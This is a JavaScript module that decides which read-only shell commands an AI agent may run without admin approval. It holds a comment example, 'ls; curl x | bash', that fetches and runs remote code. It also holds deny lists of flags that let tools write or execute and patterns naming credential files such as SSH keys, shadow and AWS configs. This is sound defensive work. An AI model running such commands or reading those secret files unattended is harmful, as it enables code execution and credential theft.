// Classifier for "read-only" shell commands that the Nova agent may run
// without asking the admin (policy.autoApproveReadOnly).
//
// This runs BEFORE a human sees anything, and the command is handed to
// `/bin/bash -c`, so a prefix match is not enough: `ls; curl x | bash` starts
// with `ls` and would sail through. The rules here are deliberately narrow —
// one command, no shell metacharacters, no flags that let a "read" tool write
// or execute, and no reads of files that are only ever secrets.
//
// Pure module, no imports: unit-testable on its own.

// Anything that can chain, redirect, substitute or expand into a second
// command. Globs (* ? [ ]) and ~ are left alone: harmless for reads.
const SHELL_METACHARACTERS = /[;&|<>`$(){}\n\r\\!]/;

// First token → allowed second tokens. `null` = no subcommand constraint.
const READ_ONLY_COMMANDS = new Map([
  ["ls", null], ["cat", null], ["head", null], ["tail", null],
  ["grep", null], ["rg", null], ["find", null], ["stat", null],
  ["file", null], ["wc", null], ["df", null], ["du", null],
  ["free", null], ["uptime", null], ["whoami", null], ["date", null],
  ["pwd", null], ["ps", null], ["id", null], ["hostname", null],
  ["journalctl", null], ["dig", null], ["nslookup", null], ["which", null],
  ["uname", null], ["lsblk", null], ["dmesg", null],
  ["systemctl", ["status", "is-active", "is-enabled", "list-units", "list-timers", "show", "cat"]],
  ["ip", ["a", "addr", "route", "link", "neigh"]],
  ["git", ["status", "log", "diff", "show", "branch", "remote", "describe"]],
  ["npm", ["ls", "list", "view", "outdated"]],
  ["node", ["-v", "--version"]],
  ["ping", null],
]);

// Flags that turn a reader into a writer or an executor.
const DANGEROUS_FLAGS = {
  find: [/^-(exec|execdir|ok|okdir)$/, /^-delete$/, /^-f(print|printf|ls|print0)$/],
  git: [/^-c$/, /^--config(=|$)/, /^--exec-path(=|$)/, /^--upload-pack(=|$)/, /^--receive-pack(=|$)/, /^--ext-diff$/, /^--output(=|$)/, /^-P$/, /^--pager(=|$)/],
  rg: [/^--pre(-glob)?(=|$)/, /^--hostname-bin(=|$)/],
  grep: [/^--devices(=|$)/],
  systemctl: [/^--root(=|$)/],
  journalctl: [/^--root(=|$)/, /^--file(=|$)/],
  npm: [/^--(prefix|userconfig|globalconfig)(=|$)/],
};

// Reading these never needs to happen unattended: they are credentials, and an
// injected prompt would love to have the agent print one into a chat.
const SECRET_PATH_PATTERNS = [
  /(^|\/)\.env(\.|$)/i,
  /(^|\/)\.ssh(\/|$)/i,
  /(^|\/)id_(rsa|dsa|ecdsa|ed25519)\b/i,
  /(^|\/)(shadow|gshadow|sudoers)\b/,
  /\.(pem|key|p12|pfx|keystore|jks)$/i,
  /(^|\/)(credentials|\.netrc|\.npmrc|\.git-credentials|\.aws|\.docker\/config\.json)\b/i,
  /(^|\/)(jwt-secret|cli-secret|machine-id)$/,
  /\bprivate[_-]?key\b/i,
];

/** Split on whitespace. Quotes are rejected upstream, so this is enough. */
function tokenize(command) {
  return command.trim().split(/\s+/).filter(Boolean);
}

/**
 * True when `command` is a single read-only invocation that is safe to run
 * without admin approval. Everything else returns false and goes to the
 * human approval queue — the classifier never has to be clever, only strict.
 *
 * @param {string} command
 * @returns {boolean}
 */
export function isReadOnlyCommand(command) {
  const raw = String(command ?? "");
  if (!raw.trim()) return false;
  // Quotes would hide metacharacters from the token scan.
  if (/["']/.test(raw)) return false;
  if (SHELL_METACHARACTERS.test(raw)) return false;

  const tokens = tokenize(raw);
  const [name, ...rest] = tokens;
  if (!READ_ONLY_COMMANDS.has(name)) return false;

  const allowedSubcommands = READ_ONLY_COMMANDS.get(name);
  if (allowedSubcommands) {
    // The subcommand is the first token that is not a flag.
    const sub = rest.find((t) => !t.startsWith("-")) ?? rest[0];
    if (!sub || !allowedSubcommands.includes(sub)) return false;
  }

  const dangerous = DANGEROUS_FLAGS[name] || [];
  for (const token of rest) {
    if (dangerous.some((rx) => rx.test(token))) return false;
    if (SECRET_PATH_PATTERNS.some((rx) => rx.test(token))) return false;
  }

  return true;
}

export const __test__ = { SHELL_METACHARACTERS, READ_ONLY_COMMANDS, SECRET_PATH_PATTERNS };
